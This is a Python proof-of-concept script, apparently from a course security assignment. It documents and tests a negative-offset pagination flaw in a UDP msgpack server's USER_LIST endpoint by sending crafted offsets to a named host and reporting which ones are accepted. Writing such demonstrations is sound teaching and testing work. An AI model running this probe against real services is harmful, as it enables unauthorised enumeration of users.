"""
VULN-06: Negative offset wraps to end of list (Python slice artefact)
======================================================================
The USER_LIST endpoint (request_type 14) accepts a negative offset and
returns results from the end of the user list. This is because the server
uses Python list slicing directly (users[offset:offset+n]) without
validating that the offset is non-negative.

In Python, list[-1:] returns the last element, list[-2:] the last two, etc.

Impact: an attacker can jump directly to the last page of users (e.g.
most recently registered) without knowing the total user count, bypassing
the intended sequential pagination.

Run: uv run python vulnerabilities/poc_06_negative_offset.py
"""
import socket, msgpack, random, time

HOST, PORT = 'csc4026z.link', 51825

def connect():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.settimeout(5.0)
    s.connect((HOST, PORT))
    handle = random.randrange(1, 2**32)
    s.send(msgpack.packb({'request_type': 1, 'request_handle': handle}))
    r = msgpack.unpackb(s.recv(4096), raw=True)
    return s, r[b'session']

def req(s, msg):
    s.send(msgpack.packb(msg))
    try:
        return msgpack.unpackb(s.recv(4096), raw=True)
    except socket.timeout:
        return None

def h():
    return random.randrange(1, 2**32)


def main():
    sock, session = connect()
    print('Testing USER_LIST pagination with invalid offsets:\n')

    offsets = [0, 1, 10, 100, -1, -5, -10]
    results = {}
    for offset in offsets:
        r = req(sock, {'request_type': 14, 'session': session,
                       'request_handle': h(), 'offset': offset})
        users = [u.decode() for u in r.get(b'users', [])] if r else []
        results[offset] = users
        label = f'offset={offset}'
        accepted = r and r.get(b'response_type') == 35
        print(f'  {label:<12} → {"ACCEPTED" if accepted else "REJECTED"}: {users}')
        time.sleep(0.15)

    sock.close()

    print(f'\n{"="*60}')
    negative_accepted = any(
        results[o] for o in offsets if o < 0 and results.get(o)
    )
    if negative_accepted:
        print('CONFIRMED: negative offsets accepted on USER_LIST.')
        print()
        print('Root cause: server does  users[offset : offset + PAGE_SIZE]')
        print('without validating offset >= 0.')
        print()
        print('In Python, list[-1:] returns the LAST element,')
        print('so offset=-1 exposes the last page regardless of list length.')
        print()
        print('Also note: invalid types (float, string) in offset leak Python')
        print('exception messages — see VULN-03.')
    else:
        print('Negative offsets returned empty lists (no users at end of list).')
        print('Try with more users connected to confirm the wrap-around.')


if __name__ == '__main__':
    main()
